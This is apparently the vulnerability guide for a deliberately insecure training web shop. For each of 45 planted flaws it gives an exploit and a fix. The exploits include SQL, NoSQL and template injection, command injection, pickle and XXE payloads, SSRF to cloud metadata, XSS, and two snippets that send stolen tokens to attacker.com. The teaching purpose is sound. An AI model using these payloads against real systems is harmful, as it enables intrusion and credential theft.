# 🔓 VulnShop Vulnerabilities Documentation

This document provides a comprehensive catalog of all intentional vulnerabilities in VulnShop, organized by service. Each vulnerability includes exploitation techniques and remediation guidance.

> 📋 **Progress Tracking**: Use the checkboxes to track your discovery and exploitation progress!

## Table of Contents

1. [API Gateway Vulnerabilities](#api-gateway-vulnerabilities)
2. [Auth Service Vulnerabilities](#auth-service-vulnerabilities)
3. [User Service Vulnerabilities](#user-service-vulnerabilities)
4. [Product Service Vulnerabilities](#product-service-vulnerabilities)
5. [Order Service Vulnerabilities](#order-service-vulnerabilities)
6. [Payment Service Vulnerabilities](#payment-service-vulnerabilities)
7. [Notification Service Vulnerabilities](#notification-service-vulnerabilities)
8. [Frontend Vulnerabilities](#frontend-vulnerabilities)

---

## API Gateway Vulnerabilities

### 1. CORS Misconfiguration

- [ ] **Found and exploited**

**OWASP Category**: A01:2021 – Broken Access Control  
**CWE**: CWE-942 (Overly Permissive Cross-domain Whitelist)  
**Severity**: High  
**Location**: `gateway/src/index.js:10-15`

**Description**: The API Gateway allows requests from any origin (`origin: '*'`) with credentials enabled, allowing attackers to make cross-origin requests from malicious websites.

**How to Exploit**:
```javascript
// Malicious website code
fetch('http://localhost:8080/auth/login', {
  method: 'POST',
  credentials: 'include',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ username: 'victim', password: 'guessed' })
})
.then(r => r.json())
.then(data => {
  // Send stolen token to attacker's server
  fetch('https://attacker.com/steal?token=' + data.token);
});
```

**How to Fix**:
- Specify allowed origins explicitly
- Don't use `credentials: true` with `origin: '*'`
```javascript
app.use(cors({
  origin: ['https://trusted-domain.com'],
  credentials: true
}));
```

### 2. Missing Rate Limiting

- [ ] **Found and exploited**

**OWASP Category**: A04:2021 – Insecure Design  
**CWE**: CWE-307 (Improper Restriction of Excessive Authentication Attempts)  
**Severity**: High  
**Location**: `gateway/src/index.js` (entire file)

**Description**: No rate limiting on any endpoint allows brute force attacks, DDoS, and resource exhaustion.

**How to Exploit**:
```bash
# Brute force login
for i in {1..10000}; do
  curl -X POST http://localhost:8080/auth/login \
    -H "Content-Type: application/json" \
    -d '{"username":"admin","password":"pass'$i'"}'
done
```

**How to Fix**:
```javascript
const rateLimit = require('express-rate-limit');
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100 // limit each IP to 100 requests per windowMs
});
app.use(limiter);
```

### 3. Missing Security Headers

- [ ] **Found and exploited**

**OWASP Category**: A05:2021 – Security Misconfiguration  
**CWE**: CWE-693 (Protection Mechanism Failure)  
**Severity**: Medium  
**Location**: `gateway/src/index.js:17-19`

**Description**: Missing security headers like X-Frame-Options, X-Content-Type-Options, CSP, HSTS.

**How to Exploit**:
- Clickjacking attacks (no X-Frame-Options)
- MIME sniffing attacks (no X-Content-Type-Options)
- XSS attacks (no CSP)

**How to Fix**:
```javascript
const helmet = require('helmet');
app.use(helmet());
```

### 4. Verbose Error Messages

- [ ] **Found and exploited**

**OWASP Category**: A05:2021 – Security Misconfiguration  
**CWE**: CWE-209 (Generation of Error Message Containing Sensitive Information)  
**Severity**: Medium  
**Location**: `gateway/src/index.js:24-38`

**Description**: Error handler exposes stack traces, internal service URLs, and headers.

**How to Exploit**:
```bash
# Trigger error to see internal architecture
curl http://localhost:8080/nonexistent
```

**How to Fix**:
- Log errors server-side
- Return generic error messages to clients
- Never expose stack traces in production

### 5. No Input Validation

- [ ] **Found and exploited**

**OWASP Category**: A03:2021 – Injection  
**CWE**: CWE-20 (Improper Input Validation)  
**Severity**: High  
**Location**: `gateway/src/index.js:21`

**Description**: Gateway accepts and forwards requests without any validation or sanitization.

**How to Exploit**:
- Pass malicious payloads through gateway
- Exploit downstream services

**How to Fix**:
- Validate all input at the gateway
- Sanitize data before forwarding
- Use schema validation (e.g., Joi, Yup)

---

## Auth Service Vulnerabilities

### 6. SQL Injection in Login

- [ ] **Found and exploited**

**OWASP Category**: A03:2021 – Injection  
**CWE**: CWE-89 (SQL Injection)  
**Severity**: Critical  
**Location**: `auth-service/src/routes/auth.js:93-95`

**Description**: Login endpoint uses string concatenation to build SQL queries, allowing SQL injection attacks.

**How to Exploit**:
```bash
# Bypass authentication
curl -X POST http://localhost:3001/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'\'' OR '\''1'\''='\''1","password":"anything"}'

# Or with comment
curl -X POST http://localhost:3001/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'\''--","password":""}'
```

**How to Fix**:
```javascript
// Use parameterized queries
const result = await pool.query(
  'SELECT * FROM users WHERE username = $1 AND password_hash = $2',
  [username, passwordHash]
);
```

### 7. Weak JWT Secret

- [ ] **Found and exploited**

**OWASP Category**: A02:2021 – Cryptographic Failures  
**CWE**: CWE-798 (Use of Hard-coded Credentials)  
**Severity**: Critical  
**Location**: `auth-service/src/routes/auth.js:11`

**Description**: JWT secret is hardcoded as "secret123", making it easy to forge tokens.

**How to Exploit**:
```javascript
const jwt = require('jsonwebtoken');
const token = jwt.sign(
  { id: 1, username: 'admin', role: 'admin' },
  'secret123'  // Weak secret
);
console.log(token);
```

**How to Fix**:
- Use strong, randomly generated secrets (32+ characters)
- Store secrets in environment variables
- Rotate secrets regularly
```javascript
const JWT_SECRET = crypto.randomBytes(64).toString('hex');
```

### 8. Weak Password Hashing (MD5)

- [ ] **Found and exploited**

**OWASP Category**: A02:2021 – Cryptographic Failures  
**CWE**: CWE-327 (Use of a Broken or Risky Cryptographic Algorithm)  
**Severity**: Critical  
**Location**: `auth-service/src/routes/auth.js:14-16`

**Description**: Passwords are hashed using MD5 without salt, which is easily cracked with rainbow tables.

**How to Exploit**:
```bash
# Crack MD5 hash
echo -n "admin123" | md5sum
# Result: 0192023a7bbd73250516f069df18b500
```

**How to Fix**:
```javascript
const bcrypt = require('bcrypt');
const saltRounds = 12;
const hash = await bcrypt.hash(password, saltRounds);
```

### 9. User Enumeration

- [ ] **Found and exploited**

**OWASP Category**: A01:2021 – Broken Access Control  
**CWE**: CWE-203 (Observable Discrepancy)  
**Severity**: Medium  
**Location**: `auth-service/src/routes/auth.js:71-85`

**Description**: Different error messages reveal whether a username exists.

**How to Exploit**:
```bash
# Check if user exists
curl -X POST http://localhost:3001/login \
  -d '{"username":"admin","password":"wrong"}'
# Response: "The password is incorrect" (user exists)

curl -X POST http://localhost:3001/login \
  -d '{"username":"nonexistent","password":"wrong"}'
# Response: "This username does not exist" (user doesn't exist)
```

**How to Fix**:
- Use generic error messages
- Same response time for both cases
```javascript
return res.status(401).json({ 
  error: 'Invalid username or password'
});
```

### 10. JWT with No Expiration

- [ ] **Found and exploited**

**OWASP Category**: A07:2021 – Identification and Authentication Failures  
**CWE**: CWE-613 (Insufficient Session Expiration)  
**Severity**: High  
**Location**: `auth-service/src/routes/auth.js:48-51, 98-101`

**Description**: JWT tokens never expire, allowing stolen tokens to be used indefinitely.

**How to Exploit**:
- Steal a token once, use it forever
- No way to invalidate compromised tokens

**How to Fix**:
```javascript
const token = jwt.sign(
  { id: user.id, username: user.username, role: user.role },
  JWT_SECRET,
  { expiresIn: '1h' }  // Add expiration
);
```

### 11. Mass Assignment in Registration

- [ ] **Found and exploited**

**OWASP Category**: A01:2021 – Broken Access Control  
**CWE**: CWE-915 (Improperly Controlled Modification of Dynamically-Determined Object Attributes)  
**Severity**: High  
**Location**: `auth-service/src/routes/auth.js:33`

**Description**: Users can set their own role during registration.

**How to Exploit**:
```bash
curl -X POST http://localhost:3001/register \
  -H "Content-Type: application/json" \
  -d '{"username":"hacker","email":"hack@evil.com","password":"pass","role":"admin"}'
```

**How to Fix**:
```javascript
// Always set role explicitly, ignore user input
const role = 'user';  // Don't use req.body.role
```

---

## User Service Vulnerabilities

### 12. NoSQL Injection in Profile Lookup

- [ ] **Found and exploited**

**OWASP Category**: A03:2021 – Injection  
**CWE**: CWE-943 (Improper Neutralization of Special Elements in Data Query Logic)  
**Severity**: Critical  
**Location**: `user-service/src/routes/users.js:21-27`

**Description**: User ID parameter is parsed as JSON without sanitization, allowing NoSQL injection.

**How to Exploit**:
```bash
# Get all users
curl 'http://localhost:3002/profile/{"$ne":null}'

# Get admin users
curl 'http://localhost:3002/profile/{"role":"admin"}'
```

**How to Fix**:
```javascript
// Validate and sanitize input
const { ObjectId } = require('mongodb');
const userId = ObjectId(req.params.userId);
const user = await db.collection('users').findOne({ _id: userId });
```

### 13. Broken Object-Level Authorization (BOLA)

- [ ] **Found and exploited**

**OWASP Category**: A01:2021 – Broken Access Control  
**CWE**: CWE-639 (Authorization Bypass Through User-Controlled Key)  
**Severity**: Critical  
**Location**: `user-service/src/routes/users.js:47-73`

**Description**: Any user can update any other user's profile by changing the userId parameter.

**How to Exploit**:
```bash
# User 1 updates User 2's profile
curl -X PUT http://localhost:3002/profile/USER2_ID \
  -H "Content-Type: application/json" \
  -d '{"email":"hacked@evil.com"}'
```

**How to Fix**:
```javascript
// Verify the authenticated user matches the userId
if (req.user.id !== req.params.userId) {
  return res.status(403).json({ error: 'Forbidden' });
}
```

### 14. Mass Assignment

- [ ] **Found and exploited**

**OWASP Category**: A01:2021 – Broken Access Control  
**CWE**: CWE-915  
**Severity**: High  
**Location**: `user-service/src/routes/users.js:56-58`

**Description**: Users can set any field including 'role', 'isAdmin', etc.

**How to Exploit**:
```bash
curl -X PUT http://localhost:3002/profile/USER_ID \
  -H "Content-Type: application/json" \
  -d '{"role":"admin","isAdmin":true}'
```

**How to Fix**:
```javascript
// Whitelist allowed fields
const allowedFields = ['email', 'username', 'firstName', 'lastName'];
const updates = {};
for (const field of allowedFields) {
  if (req.body[field]) updates[field] = req.body[field];
}
```

### 15. Missing Authentication

- [ ] **Found and exploited**

**OWASP Category**: A01:2021 – Broken Access Control  
**CWE**: CWE-306 (Missing Authentication for Critical Function)  
**Severity**: Critical  
**Location**: `user-service/src/routes/users.js` (all routes)

**Description**: No authentication checks on any endpoints.

**How to Exploit**:
```bash
# Anyone can list all users
curl http://localhost:3002/list

# Anyone can delete any user
curl -X DELETE http://localhost:3002/profile/USER_ID
```

**How to Fix**:
```javascript
// Add authentication middleware
const authenticate = (req, res, next) => {
  const token = req.headers.authorization?.split(' ')[1];
  if (!token) return res.status(401).json({ error: 'Unauthorized' });
  // Verify token...
  next();
};
router.use(authenticate);
```

### 16. NoSQL Injection in Search

- [ ] **Found and exploited**

**OWASP Category**: A03:2021 – Injection  
**CWE**: CWE-943  
**Severity**: High  
**Location**: `user-service/src/routes/users.js:95-113`

**Description**: Search query parameter parsed as JSON allows NoSQL injection.

**How to Exploit**:
```bash
# Execute JavaScript in MongoDB
curl 'http://localhost:3002/search?query={"$where":"this.password!=null"}'
```

**How to Fix**:
```javascript
// Sanitize and validate input
const query = { 
  username: new RegExp(req.query.query, 'i')  // Simple regex search only
};
```

---

## Product Service Vulnerabilities

### 17. Server-Side Request Forgery (SSRF)

- [ ] **Found and exploited**

**OWASP Category**: A10:2021 – Server-Side Request Forgery  
**CWE**: CWE-918 (Server-Side Request Forgery)  
**Severity**: Critical  
**Location**: `product-service/src/routes/products.py:115-142`

**Description**: fetch-image endpoint accepts any URL without validation, allowing access to internal services.

**How to Exploit**:
```bash
# Access internal Redis
curl -X POST http://localhost:3003/fetch-image \
  -H "Content-Type: application/json" \
  -d '{"url":"http://redis:6379"}'

# Access AWS metadata (if on AWS)
curl -X POST http://localhost:3003/fetch-image \
  -H "Content-Type: application/json" \
  -d '{"url":"http://169.254.169.254/latest/meta-data/"}'

# Scan internal network
curl -X POST http://localhost:3003/fetch-image \
  -H "Content-Type: application/json" \
  -d '{"url":"http://localhost:22"}'
```

**How to Fix**:
```python
# Whitelist allowed domains
ALLOWED_DOMAINS = ['cdn.example.com', 'images.example.com']
parsed_url = urlparse(url)
if parsed_url.netloc not in ALLOWED_DOMAINS:
    return jsonify({'error': 'Domain not allowed'}), 403

# Block private IP ranges
import ipaddress
ip = socket.gethostbyname(parsed_url.netloc)
if ipaddress.ip_address(ip).is_private:
    return jsonify({'error': 'Private IPs not allowed'}), 403
```

### 18. Insecure Deserialization (Pickle)

- [ ] **Found and exploited**

**OWASP Category**: A08:2021 – Software and Data Integrity Failures  
**CWE**: CWE-502 (Deserialization of Untrusted Data)  
**Severity**: Critical  
**Location**: `product-service/src/routes/products.py:145-180`

**Description**: Using pickle to serialize/deserialize user-controlled data allows arbitrary code execution.

**How to Exploit**:
```python
import pickle
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ('whoami',))

# Serialize exploit
payload = pickle.dumps(Exploit())
cache_key = payload.hex()

# Execute via cache endpoint
# GET /products/cache/{cache_key}
```

**How to Fix**:
```python
# Use JSON instead of pickle
import json
cached = json.dumps(product_data)

# Or use safe serialization
from jsonpickle import encode, decode
```

### 19. Directory Traversal

- [ ] **Found and exploited**

**OWASP Category**: A01:2021 – Broken Access Control  
**CWE**: CWE-22 (Path Traversal)  
**Severity**: High  
**Location**: `product-service/src/routes/products.py:183-204`

**Description**: File download endpoint doesn't sanitize file paths.

**How to Exploit**:
```bash
# Read /etc/passwd
curl 'http://localhost:3003/download?file=../../../etc/passwd'

# Read application source code
curl 'http://localhost:3003/download?file=../src/app.py'
```

**How to Fix**:
```python
import os
# Validate and sanitize file path
filename = os.path.basename(filename)  # Remove path components
file_path = os.path.join('/app/uploads', filename)
# Verify path is within uploads directory
if not os.path.abspath(file_path).startswith('/app/uploads/'):
    return jsonify({'error': 'Invalid file path'}), 400
```

### 20. Debug Mode Enabled

- [ ] **Found and exploited**

**OWASP Category**: A05:2021 – Security Misconfiguration  
**CWE**: CWE-489 (Active Debug Code)  
**Severity**: High  
**Location**: `product-service/src/app.py:10, 44`

**Description**: Flask debug mode exposes interactive debugger and stack traces.

**How to Exploit**:
- Trigger error to get interactive debugger console
- Execute arbitrary Python code
- Read source code and environment variables

**How to Fix**:
```python
# Disable debug mode in production
app.config['DEBUG'] = False

# Use proper logging instead
import logging
logging.basicConfig(level=logging.INFO)
```

### 21. Mass Assignment on Product Updates

- [ ] **Found and exploited**

**OWASP Category**: A01:2021 – Broken Access Control  
**CWE**: CWE-915  
**Severity**: Medium  
**Location**: `product-service/src/routes/products.py:76-104`

**Description**: Any field can be updated via PUT request without validation.

**How to Exploit**:
```bash
# Set arbitrary fields
curl -X PUT http://localhost:3003/1 \
  -H "Content-Type: application/json" \
  -d '{"price":0.01,"featured":true,"hidden_field":"value"}'
```

**How to Fix**:
```python
# Whitelist allowed fields
ALLOWED_FIELDS = ['name', 'description', 'price', 'stock_quantity', 'category']
update_fields = {k: v for k, v in data.items() if k in ALLOWED_FIELDS}
```

---

## Order Service Vulnerabilities

### 22. Insecure Direct Object Reference (IDOR)

- [ ] **Found and exploited**

**OWASP Category**: A01:2021 – Broken Access Control  
**CWE**: CWE-639  
**Severity**: Critical  
**Location**: `order-service/src/routes/orders.py:36-61`

**Description**: Any user can view any order by changing the order ID.

**How to Exploit**:
```bash
# View other users' orders
curl http://localhost:3004/orders/1
curl http://localhost:3004/orders/2
curl http://localhost:3004/orders/3
```

**How to Fix**:
```python
# Verify user owns the order
order = cur.fetchone()
if order['user_id'] != current_user_id:
    return jsonify({'error': 'Forbidden'}), 403
```

### 23. XML External Entity (XXE) Injection

- [ ] **Found and exploited**

**OWASP Category**: A05:2021 – Security Misconfiguration  
**CWE**: CWE-611 (Improper Restriction of XML External Entity Reference)  
**Severity**: Critical  
**Location**: `order-service/src/routes/orders.py:149-183`

**Description**: XML parser allows external entities, enabling file disclosure and SSRF.

**How to Exploit**:
```xml
<!-- Read /etc/passwd -->
<?xml version="1.0"?>
<!DOCTYPE order [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<orders>
  <order>
    <user_id>&xxe;</user_id>
    <total>100</total>
  </order>
</orders>
```

```bash
curl -X POST http://localhost:3004/orders/import \
  -H "Content-Type: application/xml" \
  --data "@xxe-payload.xml"
```

**How to Fix**:
```python
# Use defusedxml instead
from defusedxml import ElementTree as ET
root = ET.fromstring(xml_data)

# Or disable external entities
parser = ET.XMLParser()
parser.entity = {}  # Disable entities
```

### 24. Business Logic Flaw - Negative Quantities

- [ ] **Found and exploited**

**OWASP Category**: A04:2021 – Insecure Design  
**CWE**: CWE-840 (Business Logic Errors)  
**Severity**: High  
**Location**: `order-service/src/routes/orders.py:79-82`

**Description**: No validation on order quantities allows negative values for refund manipulation.

**How to Exploit**:
```bash
# Order with negative quantity to get money
curl -X POST http://localhost:3004/orders \
  -H "Content-Type: application/json" \
  -d '{
    "user_id": 1,
    "items": [
      {"product_id": 1, "quantity": -10, "price": 100}
    ]
  }'
# Total: -1000 (user receives money!)
```

**How to Fix**:
```python
# Validate positive quantities
if quantity <= 0:
    return jsonify({'error': 'Quantity must be positive'}), 400
```

### 25. Broken Access Control - Anyone Can Update Orders

- [ ] **Found and exploited**

**OWASP Category**: A01:2021 – Broken Access Control  
**CWE**: CWE-284 (Improper Access Control)  
**Severity**: High  
**Location**: `order-service/src/routes/orders.py:108-135`

**Description**: No authorization checks on order updates.

**How to Exploit**:
```bash
# Mark any order as completed without payment
curl -X PUT http://localhost:3004/orders/1 \
  -H "Content-Type: application/json" \
  -d '{"status":"completed"}'
```

**How to Fix**:
```python
# Check user authorization
if order['user_id'] != current_user_id and current_user_role != 'admin':
    return jsonify({'error': 'Forbidden'}), 403
```

---

## Payment Service Vulnerabilities

### 26. Hardcoded API Keys

- [ ] **Found and exploited**

**OWASP Category**: A02:2021 – Cryptographic Failures  
**CWE**: CWE-798 (Use of Hard-coded Credentials)  
**Severity**: Critical  
**Location**: `payment-service/main.go:20-26`

**Description**: API keys hardcoded in source code.

**How to Exploit**:
```bash
# View source code to find keys
curl http://localhost:3005/config
```

**How to Fix**:
```go
// Use environment variables
stripeKey := os.Getenv("STRIPE_API_KEY")
if stripeKey == "" {
    log.Fatal("STRIPE_API_KEY not set")
}
```

### 27. Sensitive Data Exposure - Credit Card Logging

- [ ] **Found and exploited**

**OWASP Category**: A02:2021 – Cryptographic Failures  
**CWE**: CWE-532 (Insertion of Sensitive Information into Log File)  
**Severity**: Critical  
**Location**: `payment-service/main.go:77-79`

**Description**: Full credit card numbers, CVV, and holder names logged in plaintext.

**How to Exploit**:
```bash
# View container logs
docker logs vulnshop-payment-service | grep "Card="
```

**How to Fix**:
```go
// Mask sensitive data
maskedCard := card[:4] + "****" + card[len(card)-4:]
log.Printf("Processing payment: Card=%s", maskedCard)
// Don't log CVV at all
```

### 28. Race Condition in Payment Processing

- [ ] **Found and exploited**

**OWASP Category**: A04:2021 – Insecure Design  
**CWE**: CWE-362 (Concurrent Execution using Shared Resource with Improper Synchronization)  
**Severity**: High  
**Location**: `payment-service/main.go:82-93`

**Description**: Non-atomic check for duplicate payments allows double-spend.

**How to Exploit**:
```python
import requests
import threading

def send_payment():
    requests.post('http://localhost:3005/payments', json={
        'order_id': '123',
        'amount': 100,
        'card_number': '4111111111111111'
    })

# Send multiple concurrent requests
threads = [threading.Thread(target=send_payment) for _ in range(10)]
for t in threads:
    t.start()
# Multiple payments processed for same order!
```

**How to Fix**:
```go
// Use database transactions with unique constraints
// Or use distributed locks (Redis)
```

### 29. No TLS Enforcement

- [ ] **Found and exploited**

**OWASP Category**: A02:2021 – Cryptographic Failures  
**CWE**: CWE-319 (Cleartext Transmission of Sensitive Information)  
**Severity**: High  
**Location**: `payment-service/main.go:206`

**Description**: Payment data transmitted over HTTP without encryption.

**How to Exploit**:
- Intercept network traffic with Wireshark
- Man-in-the-middle attack on local network

**How to Fix**:
```go
// Use HTTPS only
log.Fatal(http.ListenAndServeTLS(":"+port, "cert.pem", "key.pem", router))

// Redirect HTTP to HTTPS
```

### 30. Insufficient Logging of Security Events

- [ ] **Found and exploited**

**OWASP Category**: A09:2021 – Security Logging and Monitoring Failures  
**CWE**: CWE-778 (Insufficient Logging)  
**Severity**: Medium  
**Location**: `payment-service/main.go:171`

**Description**: Minimal logging of critical security events like refunds.

**How to Exploit**:
- Perform unauthorized actions without detection
- No audit trail for forensics

**How to Fix**:
```go
// Detailed security event logging
log.Printf("SECURITY: Refund initiated - PaymentID: %s, Amount: %.2f, User: %s, IP: %s, Timestamp: %s",
    paymentID, amount, userID, clientIP, time.Now())
```

---

## Notification Service Vulnerabilities

### 31. Server-Side Template Injection (SSTI)

- [ ] **Found and exploited**

**OWASP Category**: A03:2021 – Injection  
**CWE**: CWE-94 (Improper Control of Generation of Code)  
**Severity**: Critical  
**Location**: `notification-service/src/routes/notifications.py:96-125`

**Description**: Jinja2 templates created from user input allow code execution.

**How to Exploit**:
```bash
# Execute Python code
curl -X POST http://localhost:3006/render-template \
  -H "Content-Type: application/json" \
  -d '{
    "template": "{{ config.__class__.__init__.__globals__[\"os\"].popen(\"id\").read() }}"
  }'
```

**How to Fix**:
```python
# Use sandboxed environment
from jinja2.sandbox import SandboxedEnvironment
env = SandboxedEnvironment()
template = env.from_string(template_string)

# Or don't allow user-controlled templates
```

### 32. Command Injection in Email Sending

- [ ] **Found and exploited**

**OWASP Category**: A03:2021 – Injection  
**CWE**: CWE-78 (OS Command Injection)  
**Severity**: Critical  
**Location**: `notification-service/src/routes/notifications.py:40-43`

**Description**: User input passed directly to shell command.

**How to Exploit**:
```bash
# Execute arbitrary commands
curl -X POST http://localhost:3006/send-email \
  -H "Content-Type: application/json" \
  -d '{
    "email": "user@example.com; whoami",
    "subject": "Test",
    "message": "Hello"
  }'
```

**How to Fix**:
```python
# Never use shell=True with user input
# Use safe alternatives
import smtplib
from email.mime.text import MIMEText

msg = MIMEText(message)
msg['Subject'] = subject
msg['To'] = recipient
# Use proper SMTP library
```

### 33. Log Injection

- [ ] **Found and exploited**

**OWASP Category**: A09:2021 – Security Logging and Monitoring Failures  
**CWE**: CWE-117 (Improper Output Neutralization for Logs)  
**Severity**: Medium  
**Location**: `notification-service/src/routes/notifications.py:43, 62`

**Description**: Unsanitized user input written to logs.

**How to Exploit**:
```bash
# Inject fake log entries
curl -X POST http://localhost:3006/send-email \
  -H "Content-Type: application/json" \
  -d '{
    "email": "test@example.com\nADMIN LOGIN SUCCESSFUL",
    "subject": "Test",
    "message": "Hello"
  }'
```

**How to Fix**:
```python
# Sanitize log input
import re
safe_email = re.sub(r'[\n\r]', '', recipient)
print(f"Email sent to {safe_email}")
```

### 34. Unvalidated Redirects

- [ ] **Found and exploited**

**OWASP Category**: A01:2021 – Broken Access Control  
**CWE**: CWE-601 (URL Redirection to Untrusted Site)  
**Severity**: Medium  
**Location**: `notification-service/src/routes/notifications.py:153-167`

**Description**: Track endpoint redirects to any URL without validation.

**How to Exploit**:
```bash
# Redirect to phishing site
curl 'http://localhost:3006/track?redirect=https://evil-phishing-site.com&id=123'
```

**How to Fix**:
```python
# Whitelist allowed redirect domains
from urllib.parse import urlparse
ALLOWED_DOMAINS = ['example.com', 'trusted-site.com']
parsed = urlparse(redirect_url)
if parsed.netloc not in ALLOWED_DOMAINS:
    return jsonify({'error': 'Invalid redirect'}), 400
```

### 35. Command Execution Endpoint

- [ ] **Found and exploited**

**OWASP Category**: A05:2021 – Security Misconfiguration  
**CWE**: CWE-78 (OS Command Injection)  
**Severity**: Critical  
**Location**: `notification-service/src/routes/notifications.py:180-203`

**Description**: Admin endpoint executes arbitrary commands without authentication.

**How to Exploit**:
```bash
# Execute any command
curl -X POST http://localhost:3006/admin/execute \
  -H "Content-Type: application/json" \
  -d '{"command":"cat /etc/passwd"}'
```

**How to Fix**:
```python
# Remove this endpoint entirely
# If needed, add proper authentication and authorization
# Never allow arbitrary command execution
```

---

## Frontend Vulnerabilities

### 36. Reflected XSS via Search

- [ ] **Found and exploited**

**OWASP Category**: A03:2021 – Injection  
**CWE**: CWE-79 (Cross-site Scripting)  
**Severity**: High  
**Location**: `frontend/src/pages/Products.js:49-53`

**Description**: Search query rendered with dangerouslySetInnerHTML without sanitization.

**How to Exploit**:
```javascript
// Visit URL:
http://localhost:3000/products?search=<img src=x onerror=alert('XSS')>
```

**How to Fix**:
```javascript
// Don't use dangerouslySetInnerHTML
<span>{searchQuery}</span>

// Or sanitize with DOMPurify
import DOMPurify from 'dompurify';
<span dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(searchQuery) }} />
```

### 37. Stored XSS via Product Description

- [ ] **Found and exploited**

**OWASP Category**: A03:2021 – Injection  
**CWE**: CWE-79  
**Severity**: High  
**Location**: `frontend/src/pages/Products.js:58-62`

**Description**: Product descriptions rendered with dangerouslySetInnerHTML.

**How to Exploit**:
```bash
# Create product with XSS payload
curl -X POST http://localhost:3003/products \
  -H "Content-Type: application/json" \
  -d '{
    "name": "Hacked Product",
    "description": "<script>alert(document.cookie)</script>",
    "price": 99.99
  }'
```

**How to Fix**:
```javascript
// Use text content only
<div className="description">{product.description}</div>

// Or sanitize HTML
import DOMPurify from 'dompurify';
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(product.description) }} />
```

### 38. Reflected XSS via URL Parameters

- [ ] **Found and exploited**

**OWASP Category**: A03:2021 – Injection  
**CWE**: CWE-79  
**Severity**: High  
**Location**: `frontend/src/pages/Orders.js:86-91`

**Description**: URL message parameter rendered without sanitization.

**How to Exploit**:
```
http://localhost:3000/orders?message=<script>alert('XSS')</script>
```

**How to Fix**:
```javascript
// Don't render URL parameters as HTML
const message = new URLSearchParams(window.location.search).get('message');
{message && <div>{message}</div>}  // Use text, not dangerouslySetInnerHTML
```

### 39. Open Redirect

- [ ] **Found and exploited**

**OWASP Category**: A01:2021 – Broken Access Control  
**CWE**: CWE-601  
**Severity**: Medium  
**Location**: `frontend/src/pages/Orders.js:52-57`

**Description**: Redirect parameter allows redirect to any URL.

**How to Exploit**:
```
http://localhost:3000/orders?redirect=https://evil-phishing.com
```

**How to Fix**:
```javascript
// Validate redirect URLs
const redirect = new URLSearchParams(window.location.search).get('redirect');
if (redirect && redirect.startsWith('/')) {  // Only allow relative URLs
    window.location.href = redirect;
}
```

### 40. Sensitive Data in localStorage

- [ ] **Found and exploited**

**OWASP Category**: A02:2021 – Cryptographic Failures  
**CWE**: CWE-922 (Insecure Storage of Sensitive Information)  
**Severity**: High  
**Location**: `frontend/src/App.js:12-21`

**Description**: JWT tokens and user data stored in localStorage, accessible via XSS.

**How to Exploit**:
```javascript
// Via XSS, steal tokens
<script>
  fetch('https://attacker.com/steal?token=' + localStorage.getItem('token'));
</script>
```

**How to Fix**:
```javascript
// Use httpOnly cookies for tokens
// Don't store sensitive data in localStorage
// Or use sessionStorage with shorter lifetime
```

### 41. Exposed API Keys in Code

- [ ] **Found and exploited**

**OWASP Category**: A02:2021 – Cryptographic Failures  
**CWE**: CWE-798  
**Severity**: High  
**Location**: `frontend/src/App.js:45-47`, `frontend/src/pages/Profile.js:123-124`

**Description**: API keys exposed in frontend JavaScript and HTML comments.

**How to Exploit**:
```bash
# View page source
view-source:http://localhost:3000

# Or check localStorage/environment
console.log(process.env)
```

**How to Fix**:
```javascript
// Never put secrets in frontend code
// API keys should only be used server-side
// Use backend proxy for API calls requiring keys
```

### 42. Client-Side Only Validation

- [ ] **Found and exploited**

**OWASP Category**: A04:2021 – Insecure Design  
**CWE**: CWE-602 (Client-Side Enforcement of Server-Side Security)  
**Severity**: High  
**Location**: `frontend/src/pages/Login.js:19-24`, `frontend/src/pages/Register.js:21-25`

**Description**: Form validation only on client-side, easily bypassed.

**How to Exploit**:
```bash
# Bypass client validation, send directly to API
curl -X POST http://localhost:8080/auth/register \
  -H "Content-Type: application/json" \
  -d '{"username":"","email":"invalid","password":"x"}'
```

**How to Fix**:
```javascript
// Always validate on server-side
// Client-side validation is UX enhancement only
// Server must never trust client input
```

### 43. User ID Manipulation

- [ ] **Found and exploited**

**OWASP Category**: A01:2021 – Broken Access Control  
**CWE**: CWE-639  
**Severity**: High  
**Location**: `frontend/src/pages/Orders.js:20-24, 38-47`

**Description**: User ID from client-side used for orders, can be modified.

**How to Exploit**:
```javascript
// Modify user object in localStorage
let user = JSON.parse(localStorage.getItem('user'));
user.id = 999;  // Other user's ID
localStorage.setItem('user', JSON.stringify(user));
// Now create orders as that user
```

**How to Fix**:
```javascript
// Never trust client-side user data
// Server should extract user ID from verified JWT token
// Don't send user_id in requests, derive it from token on server
```

### 44. Mass Assignment via Profile Update

- [ ] **Found and exploited**

**OWASP Category**: A01:2021 – Broken Access Control  
**CWE**: CWE-915  
**Severity**: High  
**Location**: `frontend/src/pages/Profile.js:21-35, 89-91`

**Description**: Users can modify their role via profile update form.

**How to Exploit**:
```javascript
// Use form to set role to admin
// Or directly:
fetch('http://localhost:8080/users/profile/1', {
  method: 'PUT',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({role: 'admin', isAdmin: true})
});
```

**How to Fix**:
```javascript
// Don't expose sensitive fields in UI
// Server should never allow users to change their own role
// Whitelist allowed fields on server
```

### 45. Missing CSRF Protection

- [ ] **Found and exploited**

**OWASP Category**: A01:2021 – Broken Access Control  
**CWE**: CWE-352 (Cross-Site Request Forgery)  
**Severity**: Medium  
**Location**: All forms in frontend

**Description**: No CSRF tokens on state-changing requests.

**How to Exploit**:
```html
<!-- Malicious site -->
<form action="http://localhost:8080/orders" method="POST">
  <input name="user_id" value="1">
  <input name="items" value='[{"product_id":1,"quantity":100,"price":1000}]'>
</form>
<script>document.forms[0].submit();</script>
```

**How to Fix**:
```javascript
// Implement CSRF tokens
// Use SameSite cookie attribute
// Verify Origin/Referer headers on server
```

---

## Summary Statistics

**Total Vulnerabilities**: 45+

### By Severity
- 🔴 **Critical**: 18
- 🟠 **High**: 20  
- 🟡 **Medium**: 7

### By OWASP Top 10 Category
- A01 (Broken Access Control): 13
- A02 (Cryptographic Failures): 8
- A03 (Injection): 10
- A04 (Insecure Design): 4
- A05 (Security Misconfiguration): 5
